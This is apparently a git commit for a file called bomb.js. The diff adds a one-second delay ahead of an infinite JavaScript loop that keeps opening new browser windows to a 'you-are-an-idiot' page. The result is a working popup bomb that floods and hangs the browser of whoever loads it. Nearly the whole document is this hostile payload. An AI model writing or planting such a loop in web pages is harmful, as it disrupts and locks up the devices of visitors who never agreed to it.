caf59ba5d99246da23a48f95b6d3f501eff1f157
Hardwaregore <hardwaregore101@gmail.com>
2022-09-25 19:59:22 -0500

    Update bomb.js

--- bomb.js
+++ bomb.js
@@ -1,4 +1,5 @@
 // alert("you are an idiot");
+await new Promise(r => setTimeout(r, 1000));
 while (true) {
             window.open('https://hardwaregore.github.io/you-are-an-idiot', '_blank', 'toolbar=0,location=0,menubar=0');
 }
